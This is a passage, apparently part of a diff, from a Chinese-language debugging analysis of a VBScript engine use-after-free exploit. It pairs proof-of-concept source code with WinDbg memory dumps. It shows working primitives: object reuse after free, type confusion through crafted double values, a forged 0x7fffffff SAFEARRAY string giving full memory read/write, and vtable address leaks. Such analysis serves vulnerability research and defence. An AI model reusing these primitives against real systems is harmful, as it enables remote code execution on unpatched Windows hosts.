+       +0x00c pvData           : 0x00371888 Void   //array_c数据元素地址
+       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
+       
+       
+    0:006> dd 0x00371888 
+    00371888  6ab10009 010526e4 01052718 6ab14211   //023b1f98类对象地址
+    00371898  6ab10009 0105271c 01052718 6ab14211
+    003718a8  6ab10009 0105271c 01052718 6ab14211
+    003718b8  6ab10009 0105271c 01052718 6ab14211
+    003718c8  6ab10009 0105271c 01052718 6ab14211
+    003718d8  6ab10009 0105271c 01052718 6ab14211
+    003718e8  6ab10009 0105271c 01052718 6ab14211
+    003718f8  5e2b1c00 8e000000 00690066 0065006c
+    
+    0:006> dd 01052718 
+    01052718  6ab100cd 00000000 00000000 00000000   //引用计数已经为0
+    01052728  00000808 00000000 00000000 01037bcc
+    01052738  00000001 00370d34 00000000 00000000
+    01052748  5e163a16 80000000 000000d4 00000000
+    01052758  00000000 00000000 00000000 00000000
+    01052768  00000000 00000000 00000000 00000000
+    01052778  00000000 00000000 5e163a0f 80000000
+    01052788  000000db 00000000 00000000 00000000
+    
+    0:006> du 00370d34           
+    00370d34  "cla2"  
+    
+
+ ** ** **第四次`IsEmpty`断点，此时 `MyClass2_obj2 `占位已经完成：**  
+** **
+
+    
+    
+    //仍然查看 1052718 类对象地址
+    Class cla4 created at 1052718
+    
+    Breakpoint 3 hit
+    eax=6ab1185c ebx=0289cb64 ecx=6ab6a9d8 edx=0289cadc esi=0104783c edi=00000001
+    eip=6ab2c206 esp=0289c9f8 ebp=0289ca08 iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6ab2c206 8bff            mov     edi,edi
+    
+    0:006> dd 01052718 
+    01052718  6ab11748 00000002 01034700 0049e910  //引用计数变为0x02
+    01052728  00000808 00000000 00000000 00000000
+    01052738  00000000 00370d34 00000000 010526e0
+    01052748  5e163a16 80000000 000000d4 00000000
+    01052758  00000000 00000000 00000000 00000000
+    01052768  00000000 00000000 00000000 00000000
+    01052778  00000000 00000000 5e163a0f 80000000
+    01052788  000000db 00000000 00000000 00000000
+    0:006> du 00370d34          //同样的地址cla4_obj2已经占位
+    00370d34  "cla4"  
+    
+
+ ** ** **以上为`poc`中的UAF函数的作用与原理，接下来看 `InitObjects`**  
+** **
+
+### 3.2.PoC中的InitObjects  
+
+同样的我们在代码里面加入`IsEmpty`来便于调试
+
+    
+    
+    Sub InitObjects
+        IsEmpty(MyClass2_obj1)
+        MyClass2_obj1.SetProp(cla6_obj1)  '调用了两次 MyClass2_obj1的SetProp函数，分别传入的参数为 cla6_obj1
+        IsEmpty(MyClass2_obj1)
+        
+        IsEmpty(MyClass2_obj2)
+        MyClass2_obj2.SetProp(cla7_obj1)  '参数为cla7_obj1
+        IsEmpty(MyClass2_obj2)
+        spec_int_1=MyClass2_obj2.mem
+        
+    End Sub
+    
+    
+    Class MyClass2
+        Dim mem
+        Function P
+        End Function
+        Function SetProp(Value)
+            'IsEmpty("Enter MyClass2:SetPro")
+            mem=0
+            mem=Value      '分别会调用cla6与cla7的Get P
+            SetProp=0
+        End Function
+    End Class
+    
+    Class cla6
+        Public Default Property Get P
+            'IsEmpty("cal6:call Get P")
+            Dim cla5_obj1
+            P=174088534690791e-324
+            For i=0 To 6
+                array_b(i)=0
+            Next
+            'IsEmpty("finish set array_b to 0")
+            Set cla5_obj1=New cla5
+            cla5_obj1.mem=str_1
+            'IsEmpty(cla5_obj1)
+            For i=0 To 6
+                Set array_b(i)=cla5_obj1
+            Next
+        End Property
+    End Class
+    
+    Class cla7
+        Public Default Property Get P
+            Dim cla5_obj1
+            P=636598737289582e-328
+            For i=0 To 6
+                array_c(i)= 0
+            Next
+            'IsEmpty("finish set array_c to 0")
+            Set cla5_obj1=New cla5
+            cla5_obj1.mem=str_2
+            'IsEmpty(cla5_obj1)
+            For i= 0 To 6
+                Set array_c(i)=cla5_obj1
+            Next
+        End Property
+    End Class  
+    
+
+ ** ** **执行前：**  
+** **
+
+    
+    
+    //查看cla4_obj1的地址
+    0:006> dd 010526e0 
+    010526e0  6ab11748 00000002 010345e0 0049e910 //cla4_obj1.mem的地址
+    010526f0  00000808 00000000 00000000 00000000
+    01052700  00000000 003af554 01052718 010526a8
+    01052710  5e163a1d 88000000 6ab11748 00000001
+    01052720  01034700 0049e910 00000808 00000000
+    01052730  00000000 00000000 00000000 00370d34
+    01052740  00000000 010526e0 5e163a16 80000000
+    01052750  000000d4 00010a41 00000000 00000000
+    
+    0:006> du 003af554 
+    003af554  "cla4"  
+    
+
+ ** **执行到`cla4_obj1.SetProp(cla6_obj1)`这里的时候，去调用`cla4`的`SetProp`函数  
+****
+
+    
+    
+    Class cla4
+        Dim mem
+        Function P
+        End Function
+        Function SetProp(Value)
+            IsEmpty("enter cla4:SetPro")
+            mem=0
+            mem=Value    '这一步会调用cla6的Get P
+            SetProp=0
+        End Function
+    End Class  
+    
+
+ ** ** **在`Get P`中实现了又一次的占位与一次类型的替换：**  
+** **
+
+    
+    
+    Class cla6
+        Public Default Property Get P    'Property Get 语句 用来取得（返回）的值   
+            IsEmpty("cal6:call Get P")
+            Dim cla5_obj1
+      'CDbl是转换成双精度浮点数据类型
+      ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
+            P=CDbl("174088534690791e-324")   'P是返回值 对cla4_mem赋值，把string改为array类型
+            For i=0 To 6   'array_b保存了cla1 object的引用，而cla1 object被释放后是由
+                array_b(i)=0  'cla4_obj1占位的。array_b赋值为0，也就是将cla4_obj1的内存释放了
+            Next
+            IsEmpty("finish set array_b to 0")
+      
+            Set cla5_obj1=New cla5  '再次使用悬垂指针重新用cla5_obj1占位，
+            cla5_obj1.mem=str_1   '并对cla5.mem赋值伪造的字符串 7fffffff的safearray，
+      'str_1=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
+            IsEmpty(cla5_obj1)
+            For i=0 To 6
+                Set array_b(i)=cla5_obj1
+            Next
+        End Property
+    End Class  
+    
+
+ ** ** **调试：** **`cla6 Get P`中的第一个`IsEmpty`** ：  
+** **
+
+    
+    
+    //打印一个标记，表示进入Get P函数：
+    0:005> dd poi(esp+c)
+    01cd08a8  00000008 00000000 01cc7fb4 00000000
+    01cd08b8  00000000 00000000 00000000 00000000
+    01cd08c8  00000000 00000000 00000000 00000000
+    01cd08d8  00000000 00000000 00000000 00000000
+    01cd08e8  00000000 00000000 00000000 00000000
+    01cd08f8  00000000 00000000 00000000 00000000
+    01cd0908  712f0000 01cb2564 01cd2440 712f4211
+    01cd0918  0249c720 01cd0938 01cb2560 712f4211
+    0:005> du 01cc7fb4 
+    01cc7fb4  "cal6:call Get P"  
+    
+
+ ** ** **第二个`IsEmpty`：**  
+** **
+
+    
+    
+    0:005> dd poi(esp+c)
+    01cd08a8  00000008 00000000 01cc7fdc 0000200c
+    01cd08b8  02490002 01cd2fa8 01cb0006 0249c454
+    01cd08c8  02490002 01cd2fa8 01cb0001 0249c454
+    
+    0:005> du 01cc7fdc 
+    01cc7fdc  "finish set array_b to 0"
+
+Free之前的占位
+
+还记得上面分析UAF里面的第一次`cla4_obj1`对`Trigger`的占位吗，现在再次查看下这个地址：
+
+    
+    
+    // For i=0 To 6   
+    // array_b(i)=0  
+    // Next
+    //由于重新进行了调试，这一次的地址是1cb2528，最近的这条日志可以打印出这个地址
+    Class cla4 at 1cb2528, terminate called
+    
+    0:005> dd 1cb2528
+    01cb2528  712f00d4 00000000 00000000 00000000  //原本占位在这里的cla4_obj1的内存被释放了
+    01cb2538  000003ec 00000000 00000000 00000000
+    01cb2548  00000000 002de2a4 00000000 00000000
+    01cb2558  59acc226 88008da0 712f1748 00000001
+    01cb2568  01cb5210 003be638 000003ec 00000000
+    01cb2578  00000000 00000000 00000000 002a613c
+    01cb2588  00000000 01cb24f0 59acc23f 8c000000
+    01cb2598  712fce78 71303100 713030f0 00000002
+    0:005> !heap -a -p 1cb2528
+    **********************************************
+    
+    the `!heap -p' commands in exts.dll have been replaced
+    with equivalent commands in ext.dll.
+    If your are in a KD session, use `!ext.heap -p`
+    **********************************************
+    0:005> !heap -p -a 1cb2528
+        address 01cb2528 found in
+        _HEAP @ 3b0000
+          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
+            01cb2520 0007 0000  [00]   01cb2528    00030 - (free) //堆回溯查看已经被free  
+    
+
+ **重新占位，伪造数据结构**
+
+第三次断点，此时再次进行占位，使用的是`cla5_obj1`;
+
+    
+    
+    //源码
+    Set cla5_obj1=New cla5  '再次使用悬垂指针重新用cla5_obj1占位，
+            cla5_obj1.mem=str_1   
+      IsEmpty(cla5_obj1)
+      '这个str1是一个全局变量，
+      'str_1=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")  
+    
+    
+    
+    Breakpoint 3 hit
+    eax=712f185c ebx=0249c5f8 ecx=7134a9d8 edx=0249c570 esi=01cc7394 edi=00000001
+    eip=7130c206 esp=0249c48c ebp=0249c49c iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    7130c206 8bff            mov     edi,edi
+    
+    0:005> dd 01cb2528         //可以直接查看前面一步被free的地址，已经再次占位成功
+    01cb2528  712f1748 00000002 01c***f0 003be638  //这个01c***f0是cla5.mem的地址
+    01cb2538  000003ec 00000000 00000000 00000000
+    01cb2548  00000000 002de344 00000000 01cb2560
+    01cb2558  59acc226 88008da0 712f1748 00000001
+    01cb2568  01cb5210 003be638 000003ec 00000000
+    01cb2578  00000000 00000000 00000000 002a613c
+    01cb2588  01cb2528 01cb24f0 59acc23f 8c000000
+    01cb2598  712fce78 71303100 713030f0 00000002
+    
+    0:005> du 002de344
+    002de344  "cla5"
+    
+    //源码 cla5_obj1.mem=str_1
+    0:005> dd 01c***f0
+    01c***f0  01cb74a8 000000b8 00000100 00000100
+    01cb5100  00004000 01cb74ac 01cb754c 01cb3e30
+    01cb5110  0000000f 00000003 00000040 00000003
+    01cb5120  00000014 01cb5128 01cb74ac 01cb74f4
+    01cb5130  01cb752c 00000475 00000000 01cb5100
+    01cb5140  01cb5114 00000002 00000000 00000477
+    01cb5150  0000047d 000015c6 00000002 00000000
+    01cb5160  0000047e 00000482 00000bfc 00000012
+    
+    
+    0:005> dd 01cb752c
+    01cb752c  00000008 00000000 002de2f4 00000000  //0x08是类型，代表的vbstring,后面会把这个类型改为safearray即0x200c
+    01cb753c  00000000 00000000 0000822f 00000006
+    01cb754c  00000000 00000000 00000003 01cb752c
+    01cb755c  0065006d 0000006d 00000b19 00000b5b
+    01cb756c  00000000 01cb749c 01cb7540 00000001
+    01cb757c  00000000 00000b65 00000b69 01cb7824
+    01cb758c  00000001 00000000 00000b6a 00000b6e
+    01cb759c  01cb7824 00000002 00000000 00000b6f
+    
+    //看伪造的这个类似于数组的字符串，它的元素有7fffffff个,每个元素占一字节，元素内存地址为0，那它能访问的内存空间是0-0x7fffffff
+    //如果现在类型变为safearray，就能够实现全址读写
+    //str_1=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
+    0:005> dd 002de2f4        
+    002de2f4  08800001 00000001 00000000 00000000
+    002de304  7fffffff 00000000 00000000 585693f7
+    002de314  88000000 0000000e 81ea6765 98757f51  
+    
+
+双精度浮点数完成类型混淆的原理  
+
+`Get P `执行完成后，P作为返回值返回给`cla4.mem成员变量`中，那么P是什么:
+
+    
+    
+    //源码中;
+    P=174088534690791e-324 
+    //优化后这样的：
+    P=CDbl("174088534690791e-324")  //CDbl是vbs中的吧表达式转化为双精度类型的一个函数
+    
+    174088534690791 e-324 是174088534690791的-324平方
+    用c语言计算为:printf("%I64x\n",174088534690791e-324);
+    为，200c00000000,
+    由它是vbDouble类型，前面会有一个0x05的标志，
+    最终在内存中P的值为：00000005 00000000 00000000 0000200C  
+    
+
+再次查看mem地址；  
+
+    
+    
+    0:005> dd 01cb752c
+    01cb752c  0000200c 00000000 002de2f4 00000000   //类型被改为200c,代表着safearray类型01cb753c  00000000 00000000 0000822f 00000006
+    01cb754c  00000000 00000000 00000003 01cb752c
+    01cb755c  0065006d 0000006d 00000b19 00000b5b
+    01cb756c  00000000 01cb749c 01cb7540 00000001
+    01cb757c  00000000 00000b65 00000b69 01cb7824
+    01cb758c  00000001 00000000 00000b6a 00000b6e
+    01cb759c  01cb7824 00000002 00000000 00000b6f
+    
+    0:005> dd 01cb752c-c
+    01cb7520  00000005 00000000 00000000 0000200c  //这个就是P在内存中的值01cb7530  00000000 002de2f4 00000000 00000000
+    01cb7540  00000000 0000822f 00000006 00000000
+    01cb7550  00000000 00000003 01cb752c 0065006d
+    01cb7560  0000006d 00000b19 00000b5b 00000000
+    01cb7570  01cb749c 01cb7540 00000001 00000000
+    01cb7580  00000b65 00000b69 01cb7824 00000001
+    01cb7590  00000000 00000b6a 00000b6e 01cb7824
+    //为什么是从mem地址-c开始的，，这个-c的位置，是原来没有被释放的时候的cla4_obj1.mem的地址，
+    //就是P修改的是释放前的mem的地址，释放前与占位后的mem相差0x0C字节，
+    //00000005 00000000 00000000 0000200C这个数，刚好从0c的位置写入了0x200c  
+    
+
+最终实现了 `vbstring-->safearray`的类型转换，`cla5.mem`最终拿到任意地址读写权限
+
+在`InitObjects`函数中的`cla4_obj2.SetProp(cla7_obj1)`使用了同样的方法，
+
+    
+    
+    伪造的字符串:
+    str_2=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
+    转换的类型:
+    P=CDbl("636598737289582e-328")  //dd 00000005 00000000 00000000 00000003
+    0x03是vbLong类型;  
+    
+
+ ** **cla7的Get P中的第一次`IsEmpty`,free类对象地址**：  
+**
+
+    
+    
+    //这次特意提前保存了没有被free的cla4_obj2类对象地址的状态：
+    0:005> dd 1cb2560
+    01cb2560  712f1748 00000007 01cb5210 003be638
+    01cb2570  000003ec 00000000 00000000 00000000
+    01cb2580  00000000 002a613c 01cb2528 01cb24f0
+    01cb2590  59acc23f 80000000 712f00d4 71303100
+    01cb25a0  713030f0 00000000 00000000 00000000
+    01cb25b0  00000000 0249cb64 00000000 00000000
+    01cb25c0  00000000 00000000 59acc234 80000000
+    01cb25d0  712f00db 71303100 713030f0 00000000
+    //目前还是cla4_obj2.mem
+    0:005> dd 01cb5210
+    01cb5210  01cb76d8 000000ac 00000100 00000100
+    01cb5220  00004000 01cb76dc 01cb7770 01cb3ec0
+    01cb5230  0000000f 00000003 00000040 00000003
+    01cb5240  00000014 01cb5248 01cb76dc 01cb7710
+    01cb5250  01cb7750 000004a3 00000000 01cb51b8
+    01cb5260  01cb522c 00000002 00000000 000004a5
+    
+    //占位前的mem地址是01cb7750
+    0:005> dd 01cb7750 
+    01cb7750  02490000 01cd2808 01cc0000 0249ce98
+    01cb7760  00000000 01cb7938 0000822f 00000006
+    01cb7770  00000000 00000000 00000003 00000000
+    
+    
+    Class cla4 at 1cb2560, terminate called
+    Breakpoint 3 hit
+    eax=712f185c ebx=0249c5f8 ecx=7134a9d8 edx=0249c570 esi=01cc7394 edi=00000001
+    eip=7130c206 esp=0249c48c ebp=0249c49c iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    7130c206 8bff            mov     edi,edi
+    
+    0:005> dd poi(esp+c)
+    01cd08a8  00000008 00000000 01cc7f6c 00000003
+    01cd08b8  02490002 01cd2fa8 01cb0006 0249c454
+    01cd08c8  02490002 01cd2fa8 01cb0001 0249c454
+    01cd08d8  00000000 00000000 00000000 00000000
+    01cd08e8  00000000 00000000 00000000 00000000
+    01cd08f8  00000000 00000000 00000000 00000000
+    01cd0908  00000005 00000000 00000000 00000003
+    01cd0918  0249c720 01cd0938 01cb2560 712f4211
+    0:005> du 01cc7f6c
+    01cc7f6c  "finish set array_c to 0"
+    
+    //再看类对象地址已经被free
+    0:005> dd 1cb2560
+    01cb2560  712f00d4 00000000 00000000 00000000
+    01cb2570  000003ec 00000000 00000000 00000000
+    01cb2580  00000000 002a613c 00000000 00000000
+    01cb2590  59acc23f 8c000000 712fce78 71303100
+    01cb25a0  713030f0 00000002 003be638 01cd27d0
+    01cb25b0  0029f090 0249cb64 00000000 00000000
+    01cb25c0  00000000 00000000 59acc234 80000000
+    01cb25d0  712f00db 71303100 713030f0 00000000
+    
+    0:005> !heap -p -a 1cb2560
+        address 01cb2560 found in
+        _HEAP @ 3b0000
+          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
+            01cb2558 0007 0000  [00]   01cb2560    00030 - (free)  
+    
+
+ ** **cla7的Get P中的第二次`IsEmpty`,占位：**  
+**
+
+    
+    
+    Breakpoint 3 hit
+    eax=712f185c ebx=0249c5f8 ecx=7134a9d8 edx=0249c570 esi=01cc7394 edi=00000001
+    eip=7130c206 esp=0249c48c ebp=0249c49c iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    7130c206 8bff            mov     edi,edi
+    0:005> dd 1cb2560
+    01cb2560  712f1748 00000002 01cb5210 003be638  //占位成功 ,01cb5210为cla5.mem
+    01cb2570  000003ec 00000000 00000000 00000000
+    01cb2580  00000000 002a613c 00000000 01cb2528
+    01cb2590  59acc23f 8c000000 712fce78 71303100
+    01cb25a0  713030f0 00000002 003be638 01cd27d0
+    01cb25b0  0029f090 0249cb64 00000000 00000000
+    01cb25c0  00000000 00000000 59acc234 8c000000
+    01cb25d0  712fce78 71303100 713030f0 00000001
+    0:005> du 002a613c
+    002a613c  "cla5"             
+    
+    :005> dd 01cb5210
+    01cb5210  01cb76d8 000000b8 00000100 00000100
+    01cb5220  00004000 01cb76dc 01cb777c 01cb3ec0
+    01cb5230  0000000f 00000003 00000040 00000003
+    01cb5240  00000014 01cb5248 01cb76dc 01cb7724
+    01cb5250  01cb775c 000004a3 00000000 01cb51b8
+    01cb5260  01cb522c 00000002 00000000 000004a5
+    01cb5270  000004aa 00000c93 00000002 00000000
+    01cb5280  000004ab 000004af 000017a6 00000012
+    
+    //可以看到占位后的地址是 01cb775c 与上面保存的占位前的mem的地址01cb7750相差0xc
+    0:005> dd 01cb775c        
+    01cb775c  00000008 00000000 002de31c 00000000 //原始类型为一个0x08 vbstring类型
+    01cb776c  00000000 00000000 0000822f 00000006
+    01cb777c  00000000 00000000 00000003 45001e5b
+    
+    //当前字符串的内容为：str_2=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
+    0:005> dd 002de31c
+    002de31c  00000000 00000000 00000000 00000000
+    002de32c  00000000 00000000 00000000 585693f2  
+    
+
+ **cla7的Get P中的第三次`IsEmpty`,类型混淆：**  
+
+    
+    
+    0:005>  dd 01cb5210
+    01cb5210  01cb76d8 000000b8 00000100 00000100
+    01cb5220  00004000 01cb76dc 01cb777c 01cb3ec0
+    01cb5230  0000000f 00000003 00000040 00000003
+    01cb5240  00000014 01cb5248 01cb76dc 01cb7724
+    01cb5250  01cb775c 000004a3 00000000 01cb51b8
+    01cb5260  01cb522c 00000002 00000000 000004a5
+    01cb5270  000004aa 00000c93 00000002 00000000
+    01cb5280  000004ab 000004af 000017a6 00000012
+    
+    0:005> dd 01cb775c
+    01cb775c  00000003 00000000 002de31c 00000000   //类型更改后，0x03是vbLong类型01cb776c  00000000 00000000 0000822f 00000006
+    01cb777c  00000000 00000000 00000003 45001e5b
+    
+    //P=CDbl("636598737289582e-328")  //dd 00000005 00000000 00000000 000000030:005> dd 01cb775c-c
+    01cb7750  00000005 00000000 00000000 00000003   
+    01cb7760  00000000 002de31c 00000000 00000000
+    01cb7770  00000000 0000822f 00000006 00000000
+    01cb7780  00000000 00000003 45001e5b 0065006d  
+    
+
+### 泄露指向字符串的指针，最后还有一句关键的代码：
+
+    
+    
+    //源码
+    Alert "InitObjects2"
+    spec_int_1=cla4_obj2.mem '这句将上面指向0000的那个字符串的指针泄露给了spec_int_1
+    IsEmpty(spec_int_1)  
+    
+    
+    
+    0:005> dd poi(esp+c)
+    0055fe68  00000003 00000000 003f9dd4 0c002e3a
+    0055fe78  00000000 00000000 02021598 00000000
+    0055fe88  024bd3d8 0055fea8 020217a0 00000000
+    0055fe98  024b0000 0055ffa8 00000000 00000000
+    0055fea8  024bd61c 0055ffa8 02021598 00000000
+    0055feb8  0000400c 00000000 02020fd0 00000000
+    0055fec8  0000400c 00000000 02020f80 00000000
+    0055fed8  0000400c 00000000 02020f3c 00000000
+    0:005> dd 003f9dd4 
+    003f9dd4  00000000 00000000 00000000 00000000 //这个地址指向的就是00那个字符串，
+    003f9de4  00780000 00000074 003f93a4 4b92935b //由于windbg重新启动地址与上面不一致，但是从周围的元素可以观察出是一致的
+    003f9df4  8c000000 00000001 00000000 00000000
+    003f9e04  7fffffff 7fffffff 80000001 80000001
+    003f9e14  00000000 4b929326 88000000 00000000
+    003f9e24  006e0000 00740069 0062004f 0065006a
+    003f9e34  00740063 00000073 003f9e4c 4b92932d
+    003f9e44  88000000 00000018 006e0049 00740069  
+    
+
+### 3.3.PoC 中的地址泄露  
+
+    
+    
+    //此函数泄露 CScriptEntryPoint 对象的虚函数表地址，该地址属于Vbscript.dll。
+    Function LeakVBAddr
+        On Error Resume Next      '忽略错误，执行下一条代码
+        Dim emptySub_addr_placeholder    '构造一个类型为null 的 CScriptEntryPoint 对象
+        emptySub_addr_placeholder=EmptySub
+        emptySub_addr_placeholder=null
+        IsEmpty(emptySub_addr_placeholder)   '此断点可以查看此 CScriptEntryPointObject 地址
+        SetMemValue emptySub_addr_placeholder  '这种传参数不用括号也是可以的
+        LeakVBAddr=GetMemValue()
+    End Function  
+    
+
+在`LeakVBAddr`函数中 `IsEmpty `断下查看 `emptySub_addr_placeholder `是什么;  
+
+    
+    
+    0:005> dd poi(esp+c)  
+    0055fe58  00000001 000007ff 0055e030 cf0000cf  //这个对象地址下一步会保存在指向空字符串+8的地方  
+    0055fe68  00000001 000007ff 0055e030 cf0000cf  
+    0055fe78  00000000 00000000 02021598 00000000  
+    0055fe88  024bd3d8 0055fea8 020217a0 00000000  
+      
+    0:005> ln poi(0055e030)                          //发现它是一个CScriptEntryPoint对象，  
+    (6a5b4934)   vbscript!CScriptEntryPoint::`vftable'   |  (6a5cab54)   vbscript!CEntryPointDispatch::`vftable'  
+    Exact matches:  
+        vbscript!CScriptEntryPoint::`vftable` = <no type information>  
+    
+
+源码短短几句简单的代码会产生一个`CScriptEntryPoint`对象的原因为： **  
+**
+
+    
+    
+    On  Error  Resume  Next                                      //首先它定义了忽略错误
+    Dim emptySub_addr_placeholder                                //定义一个变量
+    emptySub_addr_placeholder =EmptySub                          //将函数指针赋值给一个变量，VBS语法是不允许这样的
+                                                                 //但是其上面忽略了错误，最终这个函数指针的值仍然被赋值给了变量
+    emptySub_addr_placeholder=null                               //然后将该值的类型设置为null
+                                                                 //最终，变量里面仍然保存着一个函数指针，但是类型为null  
+    
+
+ ** **进入`SetMemValue`函数： 要记住上面在`InitObjects`函数的最后`spec_int_1`中保存的就是那个0字符串的地址**  
+**
+
+    
+    
+    //源码
+    Sub SetMemValue(ByRef Ili)
+        cla4_obj1.mem(spec_int_1+8)=Ili   '将CScriptEntryPoint对象放到spec_int_1+8的位置
+        IsEmpty("SetMemValue Finish")    
+    End Sub  
+    
+
+ **可以这样修改是因为在`cla4_obj1.mem`已经是一个可以全地址读写的array了，继续， **`IsEmpty`断下后：**  
+**
+
+    
+    
+    //调试
+    Breakpoint 3 hit
+    eax=6a5b185c ebx=024bcea0 ecx=6a60a9d8 edx=024bce18 esi=02016a68 edi=00000001
+    eip=6a5cc206 esp=024bcd34 ebp=024bcd44 iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6a5cc206 8bff            mov     edi,edi
+    
+    //这个地址就是上面的指向空字符的地址：
+    0:005> dd 003f9dd4
+    003f9dd4  00000000 00000000 00000001 000007ff  //从+8的位置保存的便是CScriptEntryPoint对象,这个0x01是vbNull(可查询上方表格)
+    003f9de4  0055e030 cf0000cf 003f93a4 4b92935b
+    003f9df4  8c000000 00000001 00000000 00000000
+    003f9e04  7fffffff 7fffffff 80000001 80000001
+    003f9e14  00000000 4b929326 88000000 00000000
+    003f9e24  006e0000 00740069 0062004f 0065006a
+    003f9e34  00740063 00000073 003f9e4c 4b92932d
+    003f9e44  88000000 00000018 006e0049 00740069  
+    
+
+ ** **然后进入`GetMemValue`函数：**  
+**
+
+    
+    
+    //源码Function GetMemValue
+        cla4_obj1.mem(spec_int_1)= 3   '将CScriptEntryPoint对象 的类型改为3 即为Long
+        IsEmpty("GetMemValue Finish")
+        GetMemValue=cla4_obj1.mem(spec_int_1+ 8)End Function  
+    
+
+ ** **`IsEmpty`断下后：**  
+**
+
+    
+    
+    //调试
+    0:005> dd poi(esp+c)
+    0055fe38  00000008 024bcf28 02016a38 03120780
+    0055fe48  024b0000 0055fe88 024b0001 0055c7e8
+    0055fe58  024bd194 0055fe88 0055fe68 cf0000cf
+    
+    0:005> du 02016a38 
+    02016a38  "GetMemValue Finish"   //这是打的断点标记
+    
+    0:005> dd 003f9dd4        //str_2地址
+    003f9dd4  00000002 024bcf28 02020003 03120780 //02020003高位保存的03(vbLong)就是赋值的位置，类型改变成功了，但是周围生成的值是哪里来的(这些值是不影响的但是就是没搞清楚来源)?
+    003f9de4  0055e030 cf0000cf 003f93a4 4b92935b //+8的位置没有变
+    003f9df4  8c000000 00000001 00000000 00000000
+    003f9e04  7fffffff 7fffffff 80000001 80000001
+    003f9e14  00000000 4b929326 88000000 00000000
+    003f9e24  006e0000 00740069 0062004f 0065006a
+    003f9e34  00740063 00000073 003f9e4c 4b92932d
+    003f9e44  88000000 00000018 006e0049 00740069  
+    
+
+在`GetMemValue=cla4_obj1.mem(spec_int_1+
+8)`这一步把`0055e030`的值给了`GetMemValue`，`GetMemValue`赋值给了`LeakVBAddr` ，
+**以上整个`LeakVBAddr `函数过程得到了 `vbLong `型的 `CScriptEntryPoint`对象地址 **
+
+我们在 `StartExploit `中确认一下是否正确
+
+    
+    
+    UAF
+    InitObjects
+    vb_adrr=LeakVBAddr()
+    IsEmpty(vb_adrr)  //确认IsEmpty的值  
+    
+
+ ** **在`IsEmpty `中断下：**  
+**
+
+    
+    
+    Breakpoint 3 hit
+    eax=6a5b185c ebx=024bd328 ecx=6a60a9d8 edx=024bd2a0 esi=02016a68 edi=00000001
+    eip=6a5cc206 esp=024bd1bc ebp=024bd1cc iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6a5cc206 8bff            mov     edi,edi
+    0:005> dd poi (esp+c)
+    0055fe88  02020003 03120780 0055e030 cf0000cf //的确是我们上面得到的类对象地址
+    0055fe98  024b0000 0055ffa8 00000000 00000000
+    0055fea8  024bd61c 0055ffa8 02021598 00000000
+    
+    0:005> ln poi(0055e030)
+    (6a5b4934)   vbscript!CScriptEntryPoint::`vftable'   |  (6a5cab54)   vbscript!CEntryPointDispatch::`vftable'
+    Exact matches:
+        vbscript!CScriptEntryPoint::`vftable' = <no type information>  
+    
+
+### 3.4 关键地址的获取
+
+ **3.4.1 获取虚函数表地址**
+
+ **先看`PoC `中的`GetUint32`函数：**
+
+    
+    
+    //函数参数为对象地址，然后该函数返回的是这个对象的虚函数表地址
+    Function GetUint32(addr)    
+        Dim value
+     IsEmpty("enter GetUint32")
+        cla4_obj1.mem(spec_int_1+8)=addr+4  '原本存放CScriptEntryPoint对象的位置 存放 该对象地址+4
+     IsEmpty("spec_int_1+8")
+        cla4_obj1.mem(spec_int_1)=8         '改为字符串 type string
+     IsEmpty("type string")
+        value=cla4_obj1.P0123456789
+     IsEmpty(value)
+        cla4_obj1.mem(spec_int_1)=2   '改为 整型 type vbInteger
+     IsEmpty("type vbInteger")
+        GetUint32=value     
+    End Function  
+    
+
+ ** **单纯看上面代码一头雾水，我们从内存中看：**  
+**
+
+    
+    
+    //刚enter GetUint32时，003c7c7c地址是str_2空字符串地址
+    0:005> dd 003c7c7c
+    003c7c7c  00000002 0241cdc0 772c0003 0241d1f8  //772c0003mem地址
+    003c7c8c  0061e788 0241d038 00000000 08e9cd8e  //0061e788是CScriptEntryPoint类对象地址
+    003c7c9c  80000000 688a0075 00000873 003c9188
+    003c7cac  00000000 003c7cf0 00000035 003fbc74
+    003c7cbc  003c7ccc 08e9cd85 80000000 0000007a
+    003c7ccc  00680063 00630065 0062006b 0078006f
+    003c7cdc  00000000 00000000 00000000 08e9cd80
+    003c7cec  80000000 688a0048 00000874 003c9188
+    
+    //cla4_obj1.mem(spec_int_1+8)=addr+4 
+    0:005> dd 003c7c7c
+    003c7c7c  00000002 0241cdc0 772c0003 0241d1f8
+    003c7c8c  0061e78c 0241d038 00000000 08e9cd8e  //0061e788---> 0061e78c003c7c9c  80000000 688a0075 00000873 003c9188
+    003c7cac  00000000 003c7cf0 00000035 003fbc74
+    003c7cbc  003c7ccc 08e9cd85 80000000 0000007a
+    003c7ccc  00680063 00630065 0062006b 0078006f
+    003c7cdc  00000000 00000000 00000000 08e9cd80
+    003c7cec  80000000 688a0048 00000874 003c9188
+    
+    
+    // cla4_obj1.mem(spec_int_1)=8 
+    0:005> dd 003c7c7c
